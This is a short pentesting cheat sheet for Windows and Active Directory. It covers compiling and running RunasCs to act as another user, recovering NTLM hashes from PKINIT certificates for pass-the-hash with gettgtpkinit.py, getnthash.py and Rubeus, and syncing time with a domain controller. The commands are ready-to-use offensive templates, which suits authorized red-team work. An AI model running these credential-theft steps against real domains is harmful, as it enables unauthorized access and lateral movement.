# Tricks & Utilities

- [Tricks \& Utilities](#tricks--utilities)
  - [Windows](#windows)
    - [RunasCs](#runascs)
    - [Unpac hash](#unpac-hash)
    - [Synchronising time with AD](#synchronising-time-with-ad)

## Windows

### RunasCs

RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.

- https://github.com/antonioCoco/RunasCs

```powershell
# compile RunasCs on the target with the available .NET version
# NET4
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs

# NET2
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs

# run command as another user
.\RunasCs.exe <user> <password> <command>
```

### Unpac hash

When using `PKINIT ` to obtain a TGT, the KDC include NTLM hash. It can be recovered to do pass-the-hash. 

```bash
# UNIX
gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
export KRB5CCNAME="TGT_CCACHE_FILE"
getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'

# Windows
Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```

> More information at [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)

### Synchronising time with AD

```bash
# using ntpdate
sudo ntpdate -u <DC_IP>

# faketime
faketime '2023-12-20 02:13:00'

# net time
sudo net time set -S <DC_IP>
```
